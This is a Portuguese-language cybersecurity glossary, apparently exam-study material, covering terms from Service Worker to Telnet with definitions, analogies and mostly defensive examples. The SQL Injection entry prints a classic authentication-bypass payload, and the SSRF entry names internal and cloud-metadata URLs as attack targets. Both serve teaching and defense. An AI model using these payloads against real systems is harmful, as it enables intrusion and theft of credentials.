- **Nome**: Service Worker (Worker de Rede Programável no Navegador — W3C Specification).
- **Significado**: Script JavaScript especializado que o navegador executa em segundo plano (*background thread*), **separado da página web principal** (sem acesso direto ao DOM, mas com acesso à API **Cache Storage** e ao **IndexedDB**), atuando como um **proxy de rede programável no cliente**. Uma vez registrado em um escopo sobre **HTTPS** (obrigatório por segurança, exceto em `localhost`), o Service Worker pode interceptar todas as requisições de rede da página (evento `fetch`), servir respostas offline a partir do *Cache Storage* e gerenciar notificações *Push* e sincronização em segundo plano. **Implicação de segurança**: se um atacante conseguir injetar ou comprometer o script de um Service Worker (ou se um desenvolvedor cachear indevidamente respostas de `/api/minha-conta` no *Cache Storage*), o comportamento malicioso ou os dados privados persistirão no navegador mesmo após recarregar a página, até que o Service Worker seja atualizado ou removido (**Unregister** na aba [Application](./02b-devtools-application.md#s2-2)).
- **Explicação simples**: É um secretário particular invisível que mora dentro do seu navegador: mesmo quando a página está sem internet, ele intercepta os pedidos da tela e entrega cópias guardadas no arquivo local (*Cache Storage*).
- **Exemplo de utilização**: Na aba **Application > Service workers** (e na aba **Network**), marque a opção **Bypass for network** durante uma auditoria para garantir que as requisições vão direto ao servidor real sem interferência do Service Worker.

##### Session Fixation (Fixação de Sessão)
- **Nome**: Session Fixation (Ataque de Fixação de Sessão — CWE-384).
- **Significado**: Vulnerabilidade de gerenciamento de sessão na qual a aplicação permite que um identificador de sessão (`session_id`) conhecido ou escolhido previamente pelo atacante continue sendo exatamente o mesmo **após** a vítima realizar o login com sucesso. O fluxo clássico do ataque ocorre em 3 etapas: (1) o atacante obtém ou fixa um `session_id` conhecido no navegador da vítima (ex.: enviando um link com `?SID=12345` em sistemas legados que aceitam ID na URL, ou plantando um cookie em subdomínio irmão); (2) a vítima faz login normalmente na aplicação; (3) se o servidor apenas autenticar a sessão `12345` existente **sem gerar um novo ID de sessão**, o atacante — que já conhecia o código `12345` desde o início — passa a ter acesso imediato à conta autenticada da vítima. A correção obrigatória (**[REQUISITO]**) é **invalidar a sessão anônima antiga e emitir um novo `session_id` aleatório a cada login ou mudança de nível de privilégio** (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)).
- **Explicação simples**: Antes de você entrar no clube, um golpista entrega a você uma pulseira de visitante cujo número ele já anotou no caderno (`#12345`). Quando você chega ao caixa e paga a área VIP (faz login), o atendente preguiçoso, em vez de cortar a pulseira velha e colocar uma pulseira VIP nova com número secreto, apenas libera o número `#12345` no sistema — permitindo que o golpista entre com uma cópia da mesma pulseira.
- **Exemplo de utilização**: Regeneração obrigatória do ID de sessão no momento do login em Express (`express-session`):
  ```javascript
  req.session.regenerate((err) => {
    if (err) return next(err);
    req.session.usuarioId = usuarioAutenticado.id;
    res.redirect('/dashboard');
  });
  ```

##### Session Hijacking (Sequestro de Sessão)
- **Nome**: Session Hijacking (Sequestro de Sessão Web ou TCP — CWE-522 / CWE-384).
- **Significado**: Ataque no qual um invasor captura, adivinha ou rouba o identificador de sessão ativo (`session_id` em cookie ou token JWT) de um usuário legítimo após a autenticação e passa a utilizá-lo nas próprias requisições HTTP para personificar a vítima no servidor sem precisar conhecer sua senha nem passar pelo MFA. Os principais vetores de roubo do token de sessão são:
  1. **Cross-Site Scripting (XSS)**: leitura de `document.cookie` (quando falta o atributo `HttpOnly`) ou leitura de `localStorage.getItem('token')`.
  2. **Interceptação de Rede (*Sniffing / MitM*)**: captura de pacotes em texto claro quando falta HTTPS ou falta o atributo `Secure` no cookie.
  3. **Exposição em Logs / Referer / Arquivo HAR**: quando o token viaja na URL (query string) ou quando o usuário compartilha um arquivo `.har` não sanitizado.
- **Explicação simples**: Enquanto o *Session Fixation* planta uma pulseira falsa *antes* de você fazer login, o *Session Hijacking* é bater a sua carteira *depois* que você já entrou na festa, roubar o seu crachá autenticado e usá-lo para consumir no bar em seu nome.
- **Exemplo de utilização**: A combinação dos atributos `Secure`, `HttpOnly`, `SameSite=Lax` (ou `Strict`), tempo de expiração curto (*idle/absolute timeout*) e uso exclusivo de HTTPS com HSTS constitui a defesa padrão contra o sequestro de cookies de sessão.

##### Session Storage (`window.sessionStorage`)
- **Nome**: Session Storage (*Web Storage API* — Armazenamento de Sessão de Página no Navegador).
- **Significado**: Mecanismo de armazenamento chave-valor (`string: string`) síncrono no cliente, com capacidade típica de **5 MB por origem**, que guarda dados apenas durante a **sessão da página daquela aba específica** (*top-level browsing context*). **Diferenças fundamentais em relação ao `localStorage` (tema clássico de prova)**:
  1. **Escopo restrito por aba**: se o usuário abrir duas abas para o mesmo site `https://loja-ficticia.test`, cada aba possui seu próprio `sessionStorage` isolado (enquanto o `localStorage` é compartilhado entre todas as abas da mesma origem).
  2. **Tempo de vida efêmero**: os dados do `sessionStorage` sobrevivem a recarregamentos da página (`F5`) e restaurações de aba, mas **são apagados automaticamente assim que a aba ou janela do navegador é fechada**.
  3. **Segurança**: apesar do nome conter a palavra "Session", ele **é 100% acessível via JavaScript** (`sessionStorage.getItem()`), portanto **continua vulnerável a roubo via XSS** naquela aba — tokens de sessão devem preferencialmente ficar em cookies `HttpOnly` (veja [Application](./02b-devtools-application.md#s2-2)).
- **Explicação simples**: Se o `localStorage` é o caderno permanente que fica na estante de casa para todas as abas lerem, o `sessionStorage` é o rascunho de papel que você usa em uma única carteira durante uma prova: outra pessoa sentada na carteira ao lado (outra aba) não vê o seu rascunho, e assim que você levanta e sai da sala (fecha a aba), o rascunho vai para o lixo.
- **Exemplo de utilização**: Uso ideal do `sessionStorage` para guardar o passo atual de um formulário *wizard* de múltiplas etapas naquela aba específica:
  ```javascript
  sessionStorage.setItem('etapa_checkout', '2');
  ```

##### SMB (Server Message Block)
- **Nome**: SMB (*Server Message Block* / CIFS — Protocolo de Compartilhamento de Arquivos e Impressoras em Rede, porta padrão **445 TCP**).
- **Significado**: Protocolo de rede da camada de Aplicação utilizado predominantemente em ambientes Microsoft Windows (e no Linux via *Samba*) para compartilhamento de arquivos, pastas, impressoras e comunicação entre processos em uma rede local (LAN). **Risco crítico de segurança**: a porta **445 TCP jamais deve estar aberta para a Internet**, e a versão legada **SMBv1** é **[Obsoleta]** e extremamente perigosa (foi explorada pelo exploit *EternalBlue* / MS17-010 nos surtos globais de ransomware **WannaCry** e **NotPetya**). Em redes corporativas internas, deve-se exigir **SMBv3** com criptografia e **SMB Signing** habilitados para prevenir ataques de *SMB Relay*, além de segmentação de firewall entre estações de trabalho.
- **Explicação simples**: É a pasta compartilhada na rede do escritório onde todo mundo salva planilhas: funciona muito bem dentro da sala trancada com versão moderna (SMBv3), mas se você deixar a porta `445` aberta para a rua ou usar a fechadura antiga quebrada (SMBv1), um vírus entra sozinho e se espalha de computador em computador.
- **Exemplo de utilização**: Desabilitando definitivamente o protocolo obsoleto SMBv1 no Windows PowerShell:
  ```powershell
  Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
  ```

##### SMTP (Simple Mail Transfer Protocol)
- **Nome**: SMTP (*Simple Mail Transfer Protocol* — Protocolo Simples de Transferência de Correio — RFC 5321, portas **25**, **587** e **465 TCP**).
- **Significado**: Protocolo padrão da Internet para **envio e retransmissão (*relay*) de mensagens de correio eletrônico** entre clientes de e-mail (MUA) e servidores de correio (MTA), e entre servidores de correio de diferentes domínios. Utiliza três portas distintas que costumam cair em provas:
  - **Porta 25 TCP**: retransmissão (*relay*) entre servidores de e-mail (MTA para MTA); frequentemente bloqueada por provedores residenciais e de nuvem para evitar envio de *spam*.
  - **Porta 587 TCP**: submissão de mensagens do cliente para o servidor (*Message Submission*) com upgrade criptográfico via `STARTTLS`.
  - **Porta 465 TCP**: submissão de mensagens com **TLS implícito** desde o início da conexão (*SMTPS* — recomendada pela RFC 8314).
  Por não autenticar nativamente o domínio do remetente no cabeçalho `From:`, o SMTP depende dos registros DNS **SPF** (*Sender Policy Framework*), **DKIM** (*DomainKeys Identified Mail*) e **DMARC** para impedir falsificação de e-mail (*Email Spoofing* / *Phishing*).
- **Explicação simples**: Enquanto o IMAP e o POP3 são os protocolos para você abrir a sua caixa de correio e *ler* as cartas recebidas, o **SMTP** é o caminhão carteiro que *envia e leva* a sua carta até o servidor do destinatário.
- **Exemplo de utilização**: Consulta DNS ao registro TXT de política SPF e DMARC que protege o envio SMTP de um domínio contra *spoofing*:
  ```bash
  dig +short TXT exemplo.test
  # "v=spf1 ip4:198.51.100.0/24 -all"
  ```

##### SNI (Server Name Indication)
- **Nome**: SNI (*Server Name Indication* — Indicação de Nome do Servidor — Extensão TLS RFC 6066).
- **Significado**: Extensão do protocolo **TLS** enviada pelo navegador logo na primeira mensagem do handshake (**`ClientHello`**) que informa ao servidor qual é o nome de domínio exato (`loja-ficticia.test`) que o cliente deseja acessar **antes** que o túnel criptográfico esteja concluído. O SNI é indispensável na web moderna porque um único endereço IP público (em uma CDN, Load Balancer ou servidor Nginx com *Virtual Hosts*) frequentemente hospeda dezenas ou milhares de domínios HTTPS diferentes, cada um com seu próprio certificado X.509; graças ao SNI, o servidor sabe qual certificado apresentar no `ServerHello`. **Implicação de privacidade**: no TLS 1.2 e no TLS 1.3 padrão, o campo SNI viaja em texto claro dentro do `ClientHello` (permitindo que o provedor de internet veja o domínio acessado, embora não veja o caminho `/pagina` nem os dados); a extensão moderna **ECH** (*Encrypted Client Hello*) cifra também o SNI.
- **Explicação simples**: É como chegar à portaria de um prédio comercial onde funcionam 50 empresas diferentes no mesmo endereço (mesmo IP): antes mesmo de subir pelo elevador privativo (túnel TLS), você precisa dizer ao porteiro para qual empresa veio ("Vim para a `loja-ficticia.test`") para que ele lhe entregue o crachá certo daquela empresa.
- **Exemplo de utilização**: Passando explicitamente o parâmetro `-servername` (SNI) ao testar o certificado TLS de um servidor com múltiplos domínios via OpenSSL:
  ```bash
  openssl s_client -connect 198.51.100.42:443 -servername loja-ficticia.test
  ```

##### Socket (Soquete de Rede)
- **Nome**: Socket de Rede (*Network Socket* — Ponto Final de Comunicação IPC/Rede) e WebSocket.
- **Significado**: Em Redes de Computadores e Sistemas Operacionais (API *Berkeley Sockets*), um **socket** é a abstração de ponto final (*endpoint*) de um fluxo de comunicação bidirecional, identificado localmente pelo par **`(Endereço IP : Número da Porta)`** (ex.: `192.0.2.10:443`), enquanto uma conexão TCP ativa completa é identificada de forma única no kernel pela **quíntupla** `(Protocolo, IP de Origem, Porta de Origem, IP de Destino, Porta de Destino)`. *(Nota: no Chrome DevTools, a aba Network também usa o filtro `WS` / `Socket` para inspecionar conexões bidirecionais persistentes do protocolo **WebSocket**).*
- **Explicação simples**: É a "tomada completa" da conexão de rede formada ao juntar o número do prédio (**Endereço IP**) com o número da sala (**Porta**): `203.0.113.50:443`.
- **Exemplo de utilização**: Representação de um socket local de cliente conectado a um socket remoto HTTPS de servidor:
  ```text
  Socket Local (Cliente)       Socket Remoto (Servidor)
  192.168.1.50:54812    <===>  198.51.100.42:443 (TCP ESTABELECIDO)
  ```

##### SQL Injection (SQLi — Injeção de SQL)
- **Nome**: SQL Injection (SQLi — Injeção de Comandos SQL — CWE-89, OWASP Top 10 Injection).
- **Significado**: Vulnerabilidade crítica do lado do servidor que ocorre quando uma aplicação constrói instruções SQL dinamicamente por meio da **concatenação ou interpolação direta de strings** oriundas do usuário (parâmetros de URL, campos de formulário, JSON, cabeçalhos ou cookies) em vez de separar o código SQL dos dados. Isso permite que um atacante utilize caracteres especiais da sintaxe SQL (como aspas simples `'`, comentários `--` ou `/*`, operadores booleanos `OR 1=1` e cláusulas `UNION SELECT`) para alterar a lógica da consulta original, contornar telas de autenticação, extrair tabelas inteiras do banco de dados, modificar registros ou, em configurações permissivas, executar comandos no sistema operacional. A defesa primária e definitiva (**[REQUISITO]**) é o uso de **Consultas Parametrizadas (*Parameterized Queries* / *Prepared Statements*)** com *bind parameters* (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)).
- **Explicação simples**: Em vez de entregar os dados do formulário em uma ficha grampeada separada da ordem judicial, o sistema deixa o usuário escrever dentro da própria folha da ordem judicial: o usuário fecha as aspas do nome dele e escreve `OU entregue todas as pastas do arquivo --`, e o banco de dados obedece porque não sabe onde terminava o nome e onde começou a ordem falsa.
- **Exemplo de utilização**: Comparativo entre consulta vulnerável (concatenação) e consulta segura (*Prepared Statement*) em Python/Node.js:
  ```javascript
  // INSEGURO: vulnerável a payload clássico: ' OR '1'='1' --
  const sqlRuim = `SELECT * FROM usuarios WHERE email = '${req.body.email}'`;

  // SEGURO [REQUISITO]: Prepared Statement / Parameterized Query ($1 ou ?)
  const resultado = await db.query('SELECT id, nome FROM usuarios WHERE email = $1', [req.body.email]);
  ```

##### SRI (Subresource Integrity)
- **Nome**: SRI (*Subresource Integrity* — Integridade de Sub-recursos — W3C Specification).
- **Significado**: Recurso de segurança suportado pelos navegadores modernos através do atributo HTML **`integrity`** (combinado com `crossorigin="anonymous"`) nas tags `<script>` e `<link rel="stylesheet">`. O desenvolvedor fornece o hash criptográfico em Base64 (`sha256-...`, `sha384-...` ou `sha512-...`) do arquivo exato que espera carregar de uma CDN ou servidor externo. Ao baixar o arquivo da CDN, o navegador calcula o hash local dos bytes recebidos e o compara com o atributo `integrity`: se um único byte tiver sido alterado (por exemplo, se a CDN pública foi invadida em um ataque de *Supply Chain / Magecart*), **o navegador recusa-se a executar o script** e registra um erro de segurança na aba [Console](./02c-devtools-console.md#s2-3).
- **Explicação simples**: É o código de conferência (lacre com impressão digital) da encomenda: quando o entregador terceirizado (CDN) traz o pacote de JavaScript, o navegador confere a impressão digital matemática do pacote antes de abrir; se alguém tiver mexido no arquivo lá no depósito da CDN, o navegador bloqueia a execução na hora.
- **Exemplo de utilização**: Tag `<script>` protegida por SRI com algoritmo `sha384` (**[RECOMENDAÇÃO]** forte para todo recurso estático carregado de CDN externa):
  ```html
  <script src="https://cdn.exemplo.test/chart-4.4.0.min.js"
          integrity="sha384-7n9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a"
          crossorigin="anonymous"></script>
  ```

##### SSH (Secure Shell)
- **Nome**: SSH (*Secure Shell* — Shell Seguro — RFC 4251 a RFC 4254, porta padrão **22 TCP**).
- **Significado**: Protocolo de rede criptográfico da camada de Aplicação projetado para administração remota segura de sistemas operacionais via linha de comando (CLI), transferência segura de arquivos (**SCP** e **SFTP**) e tunelamento de portas (*Port Forwarding*), substituindo protocolos legados inseguros em texto claro como o **Telnet (porta 23)** e o `rlogin`/`rsh`. O SSH cifra todo o tráfego da sessão e autentica o servidor e o usuário. As práticas de *hardening* recomendadas (**[RECOMENDAÇÃO]** / **[REQUISITO]** em servidores críticos) incluem: **desabilitar autenticação por senha** (`PasswordAuthentication no`) em favor de **autenticação por par de chaves criptográficas** (`Ed25519` ou `RSA 4096`), **proibir login direto como `root`** (`PermitRootLogin no`), restringir IPs de origem via firewall/VPN e utilizar ferramentas anti-força bruta como `fail2ban` (veja [Redes de Computadores](./04-redes-de-computadores.md#s4)).
- **Explicação simples**: É um túnel blindado e criptografado que liga o terminal do seu computador diretamente ao console de comando de um servidor Linux distante, usando uma chave digital assimétrica de alta segurança em vez de senhas simples.
- **Exemplo de utilização**: Conexão SSH utilizando chave privada `Ed25519` e configuração segura no `/etc/ssh/sshd_config`:
  ```bash
  ssh -i ~/.ssh/id_ed25519 admin_infra@198.51.100.10
  ```

##### SSL/TLS (Secure Sockets Layer / Transport Layer Security)
- **Nome**: SSL (*Secure Sockets Layer* — **[Obsoleto]**) e TLS (*Transport Layer Security* — Segurança da Camada de Transporte — TLS 1.2 na RFC 5246 e **TLS 1.3 na RFC 8446**).
- **Significado**: Protocolos criptográficos que fornecem comunicação segura fim a fim (confidencialidade, integridade e autenticidade via certificados X.509) sobre uma rede de computadores, sendo a base do **HTTPS** (porta 443), **IMAPS** (993), **SMTPS** (465), **DoT** (853) e **WSS**. **Evolução histórica cobrada em provas**:
  - **SSL 2.0 (1995) e SSL 3.0 (1996)**: completamente quebrados (ex.: ataque *POODLE*) e **banidos** (RFC 6176 / RFC 7568). O nome "SSL" permanece hoje apenas por hábito no vocabulário popular (como na fase `SSL` da aba *Timing* do DevTools).
  - **TLS 1.0 (1999) e TLS 1.1 (2006)**: **formalmente depreciados/obsoletos** pela RFC 8996 e removidos dos navegadores modernos por suportarem cifras fracas (SHA-1, CBC sem AEAD, vulneráveis a *BEAST* / *CRIME*).
  - **TLS 1.2 (2008)**: seguro quando configurado exclusivamente com suítes modernas (`ECDHE` + cifras `AEAD` como `AES-GCM` ou `ChaCha20-Poly1305`), exigindo 2-RTT no handshake completo.
  - **TLS 1.3 (2018 — RFC 8446)**: padrão atual recomendado (**[REQUISITO]** / **[RECOMENDAÇÃO]**); removeu todas as cifras legadas inseguras (RSA key transport estático, CBC, RC4, 3DES, MD5, SHA-1), tornou **Forward Secrecy (`ECDHE`) obrigatório**, cifra o certificado do servidor no handshake e reduz o handshake completo para apenas **1-RTT**.
- **Explicação simples**: O SSL era o modelo antigo de blindagem dos anos 90 (hoje proibido por ter falhas descobertas); o **TLS** (especialmente o TLS 1.3) é a blindagem moderna de última geração que protege todas as conexões HTTPS atuais, embora muitas ferramentas ainda usem o apelido antigo "SSL" por tradição.
- **Exemplo de utilização**: Configuração de servidor Nginx aceitando exclusivamente TLS 1.2 e TLS 1.3:
  ```nginx
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_prefer_server_ciphers off;
  ```

##### SSRF (Server-Side Request Forgery)
- **Nome**: SSRF (*Server-Side Request Forgery* — Falsificação de Requisição do Lado do Servidor — CWE-918, OWASP Top 10 A10:2021).
- **Significado**: Vulnerabilidade crítica na qual um atacante induz o **próprio servidor back-end** da aplicação a realizar uma requisição HTTP (ou de outro protocolo) para um destino arbitrário controlado pelo atacante. Ocorre tipicamente em funcionalidades como "importar foto a partir de uma URL", geração de PDFs no servidor, *webhooks* ou pré-visualizadores de links. Como a requisição parte de dentro do servidor da empresa (atrás do firewall de perímetro), o atacante usa o servidor como um proxy interno para:
  1. Acessar serviços internos da rede local que não estão expostos na Internet (`http://127.0.0.1:8080/admin`, bancos Redis/Elasticsearch internos, sub-redes `10.0.0.0/8` ou `192.168.0.0/16`);
  2. Consultar o endpoint de **Metadados da Instância em Nuvem (IMDS)** no endereço link-local **`http://169.254.169.254/latest/meta-data/`** (AWS, GCP, Azure) para roubar credenciais temporárias de IAM do servidor! A defesa exige **allowlist estrita de domínios**, resolução de DNS com bloqueio de todas as faixas de IPs privados/loopback/link-local (prevenindo *DNS Rebinding*), desativação de redirecionamentos HTTP automáticos no cliente HTTP do servidor e uso obrigatório de **IMDSv2** na nuvem (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)).
- **Explicação simples**: Enquanto no **CSRF** o atacante engana o *navegador do cliente* para mandar um pedido ao servidor, no **SSRF** o atacante engana o *próprio servidor* da empresa ("Ei servidor, baixe uma foto deste link aqui: `http://127.0.0.1/painel-interno`") para que o servidor tire uma foto das salas secretas da rede interna que são proibidas para quem está na rua.
- **Exemplo de utilização**: Diferença essencial para não errar em prova:
  - **CSRF** = vitima o **navegador do usuário** (explora a confiança do servidor no navegador autenticado do cliente).
  - **SSRF** = vitima o **servidor back-end** (explora a confiança da rede interna/nuvem nas requisições disparadas pelo próprio servidor).

##### Stack Trace (Rastreamento de Pilha de Execução)
- **Nome**: Stack Trace (Rastro da Pilha de Chamadas em Exceções).
- **Significado**: Relatório técnico gerado pelo motor de execução (JavaScript V8 no navegador, ou Node.js, Python, Java, PHP, .NET no servidor) no momento em que ocorre um erro ou exceção (`Error` / `Exception`), listando em ordem cronológica inversa todas as funções, caminhos completos de arquivos e números exatos de linha que estavam na pilha de execução (*Call Stack*) até o ponto da falha.
  - **No DevTools ([Console](./02c-devtools-console.md#s2-3) e [Network > Initiator](./02a-devtools-network.md#s2-1))**: é uma ferramenta legítima para o desenvolvedor rastrear a causa de um erro no front-end.
  - **Na resposta HTTP de um servidor em produção (`500 Internal Server Error`)**: retornar um *stack trace* de back-end para o navegador do usuário é uma vulnerabilidade clássica de **Security Misconfiguration / Information Disclosure** (CWE-209), pois revela estrutura de diretórios do servidor (`/var/www/app/...`), nomes de tabelas do banco de dados, lógica de código e versões exatas de frameworks/bibliotecas que auxiliam um atacante a planejar ataques direcionados.
- **Explicação simples**: É a "ficha médica de autópsia" do erro de programação: excelente para o médico (desenvolvedor) estudar no laboratório interno, mas um risco grave se for colada na vitrine da loja (resposta HTTP 500) mostrando a planta interna do sistema para qualquer estranho.
- **Exemplo de utilização**: Tratamento seguro de erros no back-end (logando o *stack trace* internamente no servidor e retornando apenas uma mensagem genérica padronizada ao cliente):
  ```javascript
  app.use((err, req, res, next) => {
    loggerInterno.error({ erro: err.message, stack: err.stack, reqId: req.id });
    res.status(500).json({ erro: 'Erro interno no processamento. Código: ' + req.id });
  });
  ```

##### Stateless (Sem Estado)
- **Nome**: Stateless (Protocolo ou Arquitetura Sem Estado).
- **Significado**: Propriedade de um protocolo de comunicação ou arquitetura de servidor na qual **cada requisição é tratada como uma transação completamente independente**, sem que o protocolo ou o servidor mantenha automaticamente em memória o contexto ou o histórico de requisições anteriores do mesmo cliente.
  - **Protocolos Stateless**: o **IP** (Camada 3), o **UDP** (Camada 4) e o **HTTP** (Camada 7) são protocolos *stateless* por natureza. Para criar a experiência de uma sessão de login contínua sobre o HTTP *stateless*, as aplicações web acrescentam mecanismos explícitos de estado (como **Cookies de Sessão** ou **Tokens JWT** enviados em cada requisição).
  - **Autenticação Stateless vs Stateful**: uma sessão tradicional com `session_id` opaco é **Stateful** no servidor (pois o servidor guarda os dados da sessão no Redis/memória); já um **JWT** autocontido permite autenticação **Stateless** (pois o servidor valida apenas a assinatura criptográfica do token sem precisar consultar uma tabela de sessões a cada chamada, embora isso torne a revogação imediata mais complexa).
- **Explicação simples**: É um atendente com amnésia total: a cada frase que você diz a ele, você precisa mostrar seu crachá de novo e explicar o pedido completo, porque ele não guarda nenhuma lembrança da pergunta que você fez 2 segundos atrás.
- **Exemplo de utilização**: Como o HTTP é *stateless*, se o navegador não enviar o cabeçalho `Cookie` ou `Authorization` na segunda requisição, o servidor responderá `401 Unauthorized` mesmo que o usuário tenha acabado de fazer login na primeira requisição.

##### Status Code (Código de Status HTTP)
- **Nome**: HTTP Status Code (Código de Estado de Resposta HTTP — RFC 9110).
- **Significado**: Número inteiro de **3 dígitos** retornado pelo servidor na primeira linha da resposta HTTP (*Status Line*) que indica o resultado semântico do processamento da requisição, agrupado em **5 classes** pelo primeiro dígito:
  - **`1xx` (Informativo)**: requisição recebida, processamento em andamento (`100 Continue`, `101 Switching Protocols` usado no upgrade para WebSocket).
  - **`2xx` (Sucesso)**: requisição aceita e processada com êxito (`200 OK`, `201 Created`, `204 No Content`, `206 Partial Content`).
  - **`3xx` (Redirecionamento)**: ação adicional necessária para completar a requisição (`301 Moved Permanently`, `302 Found`, `304 Not Modified`, `307 Temporary Redirect`, `308 Permanent Redirect`).
  - **`4xx` (Erro do Cliente)**: a requisição contém sintaxe inválida, falta de autenticação ou falta de permissão (`400 Bad Request`, `401 Unauthorized` = *não autenticado*, `403 Forbidden` = *não autorizado*, `404 Not Found`, `405 Method Not Allowed`, `422 Unprocessable Content`, `429 Too Many Requests`).
  - **`5xx` (Erro do Servidor)**: o servidor falhou ao cumprir uma requisição aparentemente válida (`500 Internal Server Error`, `502 Bad Gateway`, `503 Service Unavailable`, `504 Gateway Timeout` — veja detalhes em [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1)).
- **Explicação simples**: É o carimbo numérico que o servidor bate no topo da resposta: começa com `2` = deu tudo certo; começa com `3` = mudou de endereço ou use seu cache; começa com `4` = você fez algo errado ou não tem permissão; começa com `5` = o servidor quebrou lá dentro.
- **Exemplo de utilização**: Diferença clássica de prova entre `401` e `403`:
  - `401 Unauthorized`: "Eu não sei quem você é — faça login ou envie credenciais válidas (`WWW-Authenticate`)."
  - `403 Forbidden`: "Eu sei quem você é (ou suas credenciais não importam), mas você não tem permissão para acessar este recurso."

##### Sub-rede (Subnet)
- **Nome**: Sub-rede (*Subnet* / *Subnetwork* — Segmentação Lógica de Rede IP).
- **Significado**: Divisão lógica de uma rede IP maior em múltiplos segmentos menores e independentes (definidos por um prefixo **CIDR** e uma **Máscara de Sub-rede**), onde todos os dispositivos dentro da mesma sub-rede compartilham o mesmo prefixo de rede e podem comunicar-se diretamente na Camada 2 (mesmo domínio de broadcast no IPv4), enquanto a comunicação entre sub-redes diferentes exige obrigatoriamente a passagem por um **roteador / firewall (Camada 3)**. Na engenharia de cibersegurança, a divisão em sub-redes (combinada com **VLANs**) é fundamental para a **Segmentação de Rede**: isolar servidores web públicos em uma sub-rede **DMZ** (*Demilitarized Zone*), servidores de aplicação em uma sub-rede privada intermediária e bancos de dados em uma sub-rede interna restrita sem acesso direto à Internet (veja [Redes de Computadores](./04-redes-de-computadores.md#s4)).
- **Explicação simples**: Em vez de deixar um galpão inteiro sem paredes onde qualquer visitante circula até o cofre, criar sub-redes é levantar paredes divisórias com portas controladas por seguranças (roteadores/firewalls) separando a Recepção (DMZ), os Escritórios (App) e o Cofre (Banco de Dados).
- **Exemplo de utilização**: Arquitetura em 3 camadas (*Three-Tier*) segmentada em sub-redes CIDR `/24`:
  - Sub-rede DMZ (Proxy Reverso): `10.10.1.0/24`
  - Sub-rede Aplicação (Back-end): `10.10.2.0/24`
  - Sub-rede Dados (PostgreSQL, isolada): `10.10.3.0/24`

##### SYN (Synchronize Flag / SYN Flood)
- **Nome**: Flag `SYN` (*Synchronize Sequence Numbers* — RFC 9293) e Ataque de **SYN Flood**.
- **Significado**:
  1. **Flag `SYN`**: bit de controle no cabeçalho **TCP** enviado no primeiro segmento de uma conexão (`SYN=1, ACK=0`) pelo cliente e no segundo segmento (`SYN=1, ACK=1`) pelo servidor para sincronizar os números de sequência iniciais (`ISN` — *Initial Sequence Number*) durante o **Three-Way Handshake**.
  2. **Ataque de SYN Flood**: ataque clássico de Negação de Serviço (**DoS / DDoS**) na Camada 4 no qual o atacante envia milhares de segmentos `SYN` (frequentemente com endereços IP de origem falsificados — *IP Spoofing*) para uma porta aberta do servidor e **nunca envia o terceiro pacote `ACK` final**. Isso deixa milhares de conexões semiabertas (`SYN_RECV`) ocupando a fila de *backlog* do kernel até esgotar os recursos do servidor e impedir clientes legítimos de conectarem. A defesa padrão no kernel Linux e em firewalls/load balancers é o uso de **SYN Cookies** (que codificam o estado criptograficamente no próprio número de sequência `ISN` do `SYN-ACK`, alocando memória somente após o cliente responder com o `ACK` válido).
- **Explicação simples**: O `SYN` é o cliente dizendo "Olá, quero abrir uma mesa para jantar". O **SYN Flood** é um trote onde mil pessoas ligam para o restaurante pedindo para reservar uma mesa agora, o garçom separa todas as mesas do salão e fica esperando na porta (`SYN-ACK`), mas ninguém aparece para confirmar (`ACK`), deixando os clientes reais na calçada sem lugar.
- **Exemplo de utilização**: Verificando se a proteção contra SYN Flood (*SYN Cookies*) está ativa no kernel Linux:
  ```bash
  sysctl net.ipv4.tcp_syncookies
  # net.ipv4.tcp_syncookies = 1
  ```

---

<a id="s8-t"></a>
### 8.20 Letra T

##### TCP (Transmission Control Protocol)
- **Nome**: TCP (*Transmission Control Protocol* — Protocolo de Controle de Transmissão — RFC 9293).
- **Significado**: Principal protocolo da **Camada de Transporte (Camada 4)** orientado a conexão, projetado para fornecer um fluxo de bytes (*byte stream*) **confiável**, **ordenado**, **livre de duplicatas** e com **controle de fluxo e de congestionamento** sobre a camada IP (que por si só não oferece garantias). Suas características essenciais cobradas em provas são:
  - **Orientado a conexão**: exige o estabelecimento prévio via **Three-Way Handshake** (`SYN` $\rightarrow$ `SYN-ACK` $\rightarrow$ `ACK`) e encerramento gracioso em 4 etapas (`FIN` / `ACK`) ou abrupto (`RST`).
  - **Entrega confiável e ordenada**: numera cada byte transmitido (`Sequence Number`), exige confirmações (`ACK`) e retransmite automaticamente segmentos perdidos ou corrompidos (*Checksum*).
  - **Controle de fluxo e congestionamento**: ajusta a velocidade de envio conforme a janela de recepção do destinatário (*Receive Window*) e o congestionamento da rede (*Slow Start*, *Congestion Avoidance*). É o transporte usado pelo **HTTP/1.1**, **HTTP/2**, **HTTPS (sobre TCP)**, **SSH (22)**, **SMTP (25/587/465)**, **IMAP (143/993)**, **POP3 (110/995)**, **SMB (445)**, **MySQL (3306)** e **PostgreSQL (5432)** (veja [Redes de Computadores](./04-redes-de-computadores.md#s4)).
- **Explicação simples**: O TCP é uma ligação telefônica com entrega registrada e numerada: primeiro confirma que o outro lado atendeu (handshake), numera cada folha enviada, espera o destinatário confirmar que recebeu cada página na ordem certa e, se uma página se perder no caminho, manda outra cópia automaticamente.
- **Exemplo de utilização**: Comparação rápida com o UDP: o TCP prioriza **confiabilidade e integridade da ordem** ao custo de maior cabeçalho (mínimo 20 bytes) e maior latência inicial de handshake.

##### Telnet (Teletype Network)
- **Nome**: Telnet (*Teletype Network* — Protocolo de Terminal Remoto Legado — RFC 854, porta padrão **23 TCP**).
- **Significado**: Protocolo histórico da camada de Aplicação criado em 1969 para fornecer acesso remoto bidirecional em modo texto a servidores através da rede. **Risco crítico de segurança (`[Obsoleto]` para administração remota)**: o Telnet **não possui qualquer mecanismo de criptografia**, transmitindo todos os bytes — inclusive o **nome de usuário, a senha de administrador e todos os comandos digitados** — em **texto claro puro (*plaintext*)** pela rede. Qualquer atacante posicionado no mesmo segmento de rede ou no caminho (*Man-in-the-Middle* / ARP Spoofing) pode capturar a senha instantaneamente no Wireshark/`tcpdump`. Foi completamente substituído pelo **SSH (porta 22 TCP)**, devendo o serviço de servidor Telnet na porta 23 permanecer desinstalado e bloqueado por firewall.
